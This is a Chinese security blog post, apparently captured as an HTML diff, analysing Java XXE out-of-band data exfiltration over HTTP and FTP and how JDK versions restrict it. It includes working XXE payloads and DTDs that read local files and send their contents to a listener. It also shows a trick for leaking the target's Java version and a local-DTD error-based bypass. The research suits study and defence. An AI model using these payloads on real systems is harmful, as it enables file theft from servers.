@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="一个孤独散步者的梦">
+
+
+<meta property="twitter:title" content="JAVA XXE中两种数据传输形式及相关限制">
+
+    <meta property="twitter:card" content="summary">
+
+<meta property="twitter:description" content="">
+
+<title>
+
+
+     诗与胡说 - JAVA XXE中两种数据传输形式及相关限制 
+
+</title>
+<link rel="canonical" href="https://kylingit.com/blog/java-xxe%E4%B8%AD%E4%B8%A4%E7%A7%8D%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%BD%A2%E5%BC%8F%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%99%90%E5%88%B6/">
+
+
+<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
+<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">
+
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">
+
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://kylingit.com/img/favicon.png"
+
+>
+
+
+
+
+</head>
+
+
+<body>
+
+
+<section class="header">
+
+    <div class="container">
+        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
+        <div class="content">
+            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
+            <nav>
+                <ul>
+                    
+                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/about"><li>about</li></a>
+                            
+                        
+                    
+                        
+                            
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/projects"><li>projects</li></a>
+                            
+                        
+                    
+                    
+                        
+                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
+                        
+                    
+                        
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    JAVA XXE中两种数据传输形式及相关限制
+
+</div>
+
+                </div>
+                <div class="meta">
+                    <div class="date" title="Thu May 7 2020 10:40:08 UTC">May 07, 2020</div>
+                    <div class="reading-time"><div class="middot"></div>3 minutes read</div>
+                </div>
+            </div>
+            <div class="markdown">
+                
+    
+    
+
+<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>
+
+<p>示例代码：</p>
+
+<pre><code class="language-java">DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
+DocumentBuilder dbBuilder = dbFactory.newDocumentBuilder();
+doc = dbBuilder.parse(&quot;xxe.xml&quot;);
+</code></pre>
+
+<h3 id="http传输">HTTP传输</h3>
+
+<p>xxe_http.xml</p>
+
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+        &lt;!DOCTYPE ANY [
+                &lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:8080/http.dtd&quot;&gt;
+                %dtd;
+                %http;
+                %send;
+                ]&gt;
+&lt;ANY&gt;xxe&lt;/ANY&gt;
+</code></pre>
+
+<p>http.dtd</p>
+
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;
+&lt;!ENTITY % http &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1:8080/%file;'&gt;&quot;&gt;
+</code></pre>
+
+<p>在<code>dbBuilder.parse(&quot;xxe_http.xml&quot;)</code>时会产生异常</p>
+
+<pre><code>java.net.MalformedURLException: Illegal character in URL
+	at sun.net.www.http.HttpClient.getURLFile(Unknown Source)
+	at sun.net.www.protocol.http.HttpURLConnection.getRequestURI(Unknown Source)
+	at sun.net.www.protocol.http.HttpURLConnection.writeRequests(Unknown Source)
+	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.skipSeparator(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.scanDecls(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.scanDTDInternalSubset(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$DTDDriver.dispatch(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$DTDDriver.next(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$PrologDriver.next(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(Unknown Source)
+	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source)
+	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown Source)
+	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown Source)
+	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(Unknown Source)
+	at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(Unknown Source)
+	at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(Unknown Source)
+</code></pre>
+
+<p>这是因为在<code>rt.jar!/sun/net/www/http/HttpClient.class</code>中，JDK7u21</p>
+
+<pre><code class="language-java">public String getURLFile() throws IOException {
+    String str = this.url.getFile();
+    if (str == null || str.length() == 0) {
+      str = &quot;/&quot;;
+    }
+
+    if (this.usingProxy &amp;&amp; !this.proxyDisabled) {
+        //...
+    }
+    if (str.indexOf('\n') == -1) {
+      return str;
+    }
+    throw new MalformedURLException(&quot;Illegal character in URL&quot;);
+}
+</code></pre>
+
+<p>能够看到在处理httpURL的时候，如果字符串含有换行符(<code>\n</code>)就会直接抛出异常，而一般通过http外带基本只能拼接到url中，所以碰到需要往外带的数据含有换行符时就会失败</p>
+
+<p>对<code>\n</code>的处理应该在比较早的版本就引入了，从commit中看到最早在05年的代码中就有这块处理，所以默认高版本Java应该是对url都有处理的</p>
+
+<h3 id="ftp传输">FTP传输</h3>
+
+<p>xxe_ftp.xml</p>
+
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY % dtd PUBLIC &quot;-//OXML/XXE/EN&quot; &quot;http://127.0.0.1:8080/ftp.dtd&quot;&gt;
+        %dtd;%ftp;%send;
+        ]&gt;
+&lt;ANY&gt;xxe&lt;/ANY&gt;
+</code></pre>
+
+<p>ftp.dtd</p>
+
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;file:///D:/data.txt&quot;&gt;
+&lt;!ENTITY % ftp &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'ftp://fakeuser:%file;@127.0.0.1:2121'&gt;&quot;&gt;
+</code></pre>
+
+<p>其中<code>%file;</code>的引用有两种方式，一个是在PASS字段引用，一个是在URL路径中引用，两种方式存在一定差异，具体可以见下面情况一分析</p>
+
+<p>先来看触发XXE的过程中FTP客户端与服务端的交互</p>
+
+<pre><code>info: FTP: recvd 'USER fakeuser'
+info: FTP: recvd 'PASS testdata'
+info: FTP: recvd 'TYPE A'
+info: FTP: recvd 'CWD .'
+info: FTP: recvd 'EPSV ALL'
+info: FTP: recvd 'EPSV'
+info: FTP: recvd 'EPRT |1|127.0.0.1|50130|'
+info: FTP: recvd 'LIST'
+</code></pre>
+
+<p>可以看到server会向client发送几个指令，包括要求提供用户名密码(数据在此阶段被带出)，切换路径，列出文件等过程。</p>
+
+<p>使用Everything自带的FTP服务功能，通过抓包观察正常的FTP交互流程，大致是这样子的</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103436.png" alt="1575011384700" /></p>
+
+<p>注意到发送LIST指令时会返回150和226，那么在xxer中也尽可能模拟这个过程，但是在实际利用中会发现，当xxer服务端接收到LIST指令时，client与server不再有交互了，处于一个互相等待的过程中，具体的原因见下面分析</p>
+
+<p><code>sun.net.ftp.impl.FtpClient</code>处理<code>LIST</code>指令的过程中存在一个bug（可能与模拟的ftpserver没有支持所有指令有关），<code>FtpClient.openDataConnection()</code>方法中，</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103807.png" alt="1573805362144" /></p>
+
+<p>当ftpserver收到LIST指令后模拟正常ftp通信返回226代码，然后当前socket进入accept，会创建一个新的Socket，接着通过<code>java.net.ServerSocket#implAccept()</code>方法接受socket连接</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103808.png" alt="1573805487835" /></p>
+
+<p>但是此时的address是null，也就是说服务端和客户端此时是没有正常建立新的socket的，于是两端都处在等待状态，客户端就会被挂起。</p>
+
+<p>然而抓包看整个通信过程，client与server的交互与正常的交互是一模一样的，正常ftp服务端收到LIST指令后返回226传输完毕，当前socket会正常关闭，然后等待下一次交互指令，但是在xxer/xxeserv模拟的过程中却会被挂起，这个问题暂时没有解决办法。（passive mode，客户端发送指令使服务端进入被动模式，但没有效果）</p>
+
+<p>如果这个过程是发生在weblogic端并且Java版本较低时，并不影响数据传输，只是会有一个对ftpserver的长连接，但是如果是在本地通过外部实体的方式解析xml文件，同样会被挂在长连接的过程，于是就有可能无法生成相应的payload</p>
+
+<p>网上也有相关问题<a href="https://stackoverflow.com/questions/3666124/ftp-connection-hangs-on-list">https://stackoverflow.com/questions/3666124/ftp-connection-hangs-on-list</a></p>
+
+<p>Tips：如何利用FTP获取目标Java版本</p>
+
+<p>ftp.dtd</p>
+
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;file:///D:/data.txt&quot;&gt;
+&lt;!ENTITY % ftp &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'ftp://127.0.0.1:2121/%file;'&gt;&quot;&gt;
+</code></pre>
+
+<p>当不指定用户名和密码直接连接FTP时，client默认会以anonymous登录，密码则是client的Java版本，所以可以利用这个方式获取目标服务器的Java版本：</p>
+
+<pre><code>info: FTP: recvd 'USER anonymous'
+info: FTP: recvd 'PASS Java1.7.0_21@'
+info: FTP: recvd 'TYPE I'
+info: FTP: recvd 'EPSV ALL'
+info: FTP: recvd 'EPSV'
+info: FTP: recvd 'EPRT |1|127.0.0.1|54357|'
+info: FTP: recvd 'RETR tesdata'
+</code></pre>
+
+<h4 id="ftp中特殊字符的问题">FTP中特殊字符的问题</h4>
+
+<h5 id="情况一">情况一</h5>
+
+<p>各种特殊字符在特定版本下的情况</p>
+
+<ul>
+<li>测试的jdk版本：<strong>JDK7u21</strong></li>
+<li>pwd字段意义：<code>&lt;!ENTITY % ftp &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'ftp://fakeuser:%file;@127.0.0.1:2121'&gt;&quot;&gt;</code></li>
+<li>file字段意义：<code>&lt;!ENTITY % ftp &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'ftp://fakeuser:s@127.0.0.1:2121/%file;'&gt;&quot;&gt;</code></li>
+</ul>
+
+<table>
+<thead>
+<tr>
+<th>符号/位置</th>
+<th>\n</th>
+<th>[</th>
+<th>&lsquo;</th>
+<th>&ldquo;</th>
+<th>%</th>
+<th>&amp;</th>
+<th>@</th>
+<th>#</th>
+<th>?</th>
+<th>/</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>pwd字段</td>
+<td>√</td>
+<td>×</td>
+<td>×</td>
+<td>√</td>
+<td>×(*0)</td>
+<td>×(*0)</td>
+<td>×(*1)</td>
+<td>√</td>
+<td>×</td>
+<td>×</td>
+</tr>
+
+<tr>
+<td>file字段</td>
+<td>√</td>
+<td>√</td>
+<td>×</td>
+<td>√</td>
+<td>×</td>
+<td>×</td>
+<td>√</td>
+<td>√(*2)</td>
+<td>√(*3)</td>
+<td>√(*4)</td>
+</tr>
+</tbody>
+</table>
+
+<blockquote>
+<ul>
+<li>*0：org.xml.sax.SAXParseException：<code>%</code> <code>&amp;</code>都有实际意义，不能被正常引用和替换</li>
+<li>*1：java.net.UnknownHostException：@被当作用户名:密码@主机，不能正确处理</li>
+<li>*2：会截断<code>#</code>之后的内容，URL锚点</li>
+<li>*3：会截断<code>?</code>之后的内容，URL参数</li>
+<li>*4：<code>/</code>分隔的每部分会单独出现在CWD指令中，最后一部分出现在%file</li>
+</ul>
+</blockquote>
+
+<p>解决办法：</p>
+
+<ol>
+<li>单引号/双引号：能否正常读取取决于参数实体的写法，简单说就是用单引号来防止闭合双引号，用双引号来防止闭合单引号；</li>
+<li><code>&lt;</code> <code>%</code> <code>&amp;</code>等，通过<code>&lt;![CDATA[&lt;&quot;%'&amp;]]&gt;</code>忽略特殊字符；</li>
+</ol>
+
+<h5 id="情况二">情况二</h5>
+
+<p>换行符在不同版本下的情况</p>
+
+<p>jdk7u131与jdk7u141的<a href="http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/comparison/e890a6aef622/src/share/classes/sun/net/ftp/impl/FtpClient.java">对比</a></p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103809.png" alt="1574933020030" /></p>
+
+<p>jdk8u131-b08与jdk8u131-b09的<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/comparison/81ddd5fc5a4e/src/share/classes/sun/net/ftp/impl/FtpClient.java">对比</a></p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103810.png" alt="1574933574859" /></p>
+
+<p>因此，通过ftp外带数据时，Java版本 <strong>&lt;7u141-b00</strong> 或 <strong>&lt;8u131-b09</strong> 时才不会受文件中<code>\n</code>的影响。</p>
+
+<p>相关链接：<a href="https://bugzilla.redhat.com/show_bug.cgi?id=1443083">https://bugzilla.redhat.com/show_bug.cgi?id=1443083</a></p>
+
+<p>上面的修复补丁都是在<code>rt.jar!/sun/net/ftp/impl/FtpClient.class#issueCommand()</code>中增加对换行符的判断，但是四哥在<a href="http://scz.617.cn/misc/201911011122.txt">Java底层修改对XXE利用FTP通道的影响</a>中提到FTP通道被阻断的时候还没有触发到<code>issueCommand()</code>，这边也来调试一下</p>
+
+<p>环境JDK8u141，直接断到<code>issueCommand()</code></p>
+
+<p>发现在8u141中，对<code>\n</code>的检查确实是在<code>issueCommand()</code>，RETR返回的数据中如果有换行符就抛出<code>sun.net.ftp.FtpProtocolException: Illegal FTP command</code>，那么四哥说的在这之前有一个checkURL方法又是在哪里呢，搜一下java源码确定一下引入checkURL是在哪个版本</p>
+
+<p>最终找到相关更新：<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/diff/5652862ec123/src/share/classes/sun/net/www/protocol/ftp/FtpURLConnection.java">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/diff/5652862ec123/src/share/classes/sun/net/www/protocol/ftp/FtpURLConnection.java</a></p>
+
+<p>github上相关<a href="https://github.com/JetBrains/jdk8u_jdk/commit/4aacc0da12ae2f5bb29aa1b304ba62da23bb024a#diff-3f0521a031333913976fe611f840d0ebR160">commit</a>，版本是 jdk8u_jdk-jb8u232-b1638.6，时间是2019年4月份</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103811.png" alt="1574996536989" /></p>
+
+<p>1.8.0_141相关调用栈</p>
+
+<pre><code>Exception in thread &quot;main&quot; java.io.IOException: sun.net.ftp.FtpProtocolException: Illegal FTP command
+	at sun.net.www.protocol.ftp.FtpURLConnection.getInputStream(FtpURLConnection.java:518)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:623)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1304)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1240)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(XMLDTDScannerImpl.java:741)
+</code></pre>
+
+<p>1.8.0_232相关调用栈</p>
+
+<pre><code>Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Illegal character in URL
+	at sun.net.www.protocol.ftp.FtpURLConnection.checkURL(FtpURLConnection.java:164)
+	at sun.net.www.protocol.ftp.FtpURLConnection.&lt;init&gt;(FtpURLConnection.java:188)
+	at sun.net.www.protocol.ftp.Handler.openConnection(Handler.java:61)
+	at sun.net.www.protocol.ftp.Handler.openConnection(Handler.java:56)
+	at java.net.URL.openConnection(URL.java:1001)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:621)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1304)
+	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1240)
+	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(XMLDTDScannerImpl.java:741)
+</code></pre>
+
+<p>综上，利用XXE漏洞通过FTP协议外带数据时，能否成功受Java版本影响，总结如下</p>
+
+<ol>
+<li><strong>&lt;7u141-b00</strong> 或 <strong>&lt;8u131-b09</strong> ：不会受文件中<code>\n</code>的影响；</li>
+<li><strong>&gt;jdk8u131</strong>：能创建FTP连接，外带文件内容中含有<code>\n</code>则抛出异常；</li>
+<li><strong>&gt;jdk8u232</strong>：不能创建FTP连接，只要url中含有<code>\n</code>就会抛出异常；</li>
+</ol>
+
+<h2 id="dtd引用中的问题">dtd引用中的问题</h2>
+
+<h3 id="问题1">问题1</h3>
+
+<p>内部实体与外部实体不能结合使用</p>
+
+<p>有一个需要注意的点是，参数实体只能在DTD中引用，举个例子</p>
+
+<pre><code class="language-xml">&lt;!ELEMENT person1 (name, sex, age)&gt;
+&lt;!ELEMENT person2 (name, sex, age)&gt;
+&lt;!ELEMENT person3 (name, sex, age)&gt;
+</code></pre>
+
+<p>为了减少重复定义某些元素，可以通过参数实体的方式进行定义，如</p>
+
+<pre><code class="language-xml">&lt;!ELEMENT %res &quot;name, sex, age&quot;&gt;
+</code></pre>
+
+<p>然后通过%res进行引用</p>
+
+<pre><code class="language-xml">&lt;!ELEMENT person1 (%res;)&gt;
+&lt;!ELEMENT person2 (%res;)&gt;
+&lt;!ELEMENT person3 (%res;)&gt;
+</code></pre>
+
+<p>但是这种元素替换的方式<strong>仅限于外部DTD</strong>。在以上过程中，参数实体将元素组保存在DTD的外部子集中，因为内部子集有非常严格的校验，即标记声明中不允许引用参数实体，如下的参数实体引用是会失败的，抛出异常<code>java.io.IOException: org.xml.sax.SAXParseException: The parameter entity reference &quot;%file;&quot; cannot occur within markup in the internal subset of the DTD.</code></p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103812.png" alt="1574842595707" /></p>
+
+<p>这些实体可以定义DTD语法，但不能定义在另一个DTD标签中立即引用，如下面的使用也将失败：</p>
+
+<pre><code class="language-xml">&lt;!ENTITY %res &quot;name, sex, age&quot;&gt;
+&lt;!ELEMENT person (%res;)&gt;
+</code></pre>
+
+<p>但是，可以通过在外部参数实体中声明，在内部DTD子集中使用的形式：</p>
+
+<pre><code class="language-xml">&lt;!DOCTYPE ANY [
+        &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/my.dtd&quot;&gt;
+&lt;ANY&gt;xxe&lt;/ANY&gt;
+</code></pre>
+
+<p>远程my.dtd</p>
+
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;file:///C:/file&quot;&gt;
+</code></pre>
+
+<p>总结，对于上面定义的参数实体，需要注意的点是：</p>
+
+<ul>
+<li>对参数实体的引用只能在DTD中发生；</li>
+<li>参数实体不能在文档主体中使用；</li>
+<li>内部DTD子集中的标记内不允许使用参数实体引用；</li>
+<li>参数实体允许创建其他实体和参数实体；</li>
+</ul>
+
+<h3 id="问题2">问题2</h3>
+
+<p>无法向外请求dtd</p>
+
+<p>假如目标系统存在防火墙，无法对外发起连接，就不能通过外部dtd注入了，此时可以利用系统本地已存在的dtd文件，覆盖其中的某个实体，通过报错形式进行利用</p>
+
+<p>local.dtd</p>
+
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+
+        &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\xwizard.dtd&quot;&gt;
+
+        &lt;!ENTITY % onerrortypes '(aa) #IMPLIED&gt;
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///D:/data.txt&quot;&gt;
+        &lt;!ENTITY &amp;#x25; http &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://127.0.0.1:8080/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;http;
+        &amp;#x25;send;
+        &lt;!ATTLIST xxe aa &quot;bb&quot; #IMPLIED'&gt;
+        %local_dtd;
+        ]&gt;
+</code></pre>
+
+<p>xxe_http.xml</p>
+
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE ANY [
+        &lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:8080/local.dtd&quot;&gt;
+        %dtd;
+        ]&gt;
+&lt;ANY&gt;xxe&lt;/ANY&gt;
+</code></pre>
+
+<p>更多的本地dtd可以参考<a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md</a></p>
+
+<p>另一个思路：从目标机器上的jar包中发现可以被利用的本地dtd文件</p>
+
+<p>参考：</p>
+
+<ul>
+<li><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/</a></li>
+<li><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></li>
+</ul>
+
+<script>pangu.spacingPage();</script>
+
+
+                <br>
+                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'kylingit';
+    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/java-xxe%E4%B8%AD%E4%B8%A4%E7%A7%8D%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%BD%A2%E5%BC%8F%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%99%90%E5%88%B6\/';
+    var disqus_title = 'JAVA XXE中两种数据传输形式及相关限制';
+    var disqus_url = 'https:\/\/kylingit.com\/blog\/java-xxe%E4%B8%AD%E4%B8%A4%E7%A7%8D%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%BD%A2%E5%BC%8F%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%99%90%E5%88%B6\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="footer">
+    <div class="container">
+        <div class="copyright">
+
+        
+            <a href="https://kylingit.com/license">Copyright © 2020 kylinking</a>
+        
+
+        </div>
+        <div class="icons">
+
+        
+            <a href="https://github.com/kylingit" target="_blank">
+                <i class="icon ion-social-github" title="github"></i>
+            </a>
+        
+
+        
+
+        
+
+        
+            <a href="mailto:ikylinking@gmail.com">
+                <i class="icon ion-ios-email larger" title="email"></i>
+            </a>
+        
+
+        
+            <a href="https://kylingit.com/index.xml">
+                <i class="icon ion-social-rss larger" title="rss"></i>
+            </a>
+        
+
+        </div>
+    </div>
+</section>
+
+
+  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
+  
+
+
+
+  <script src="https://kylingit.com/js/progressively.min.js" defer></script>
+
+
+<script>
+  window.onload = function() {
+    
+      hljs.initHighlighting();
+    
+    
+      progressively.init({delay: 30, throttle: 50});
+    
+  };
+</script>
+
+</body>
+</html>
+
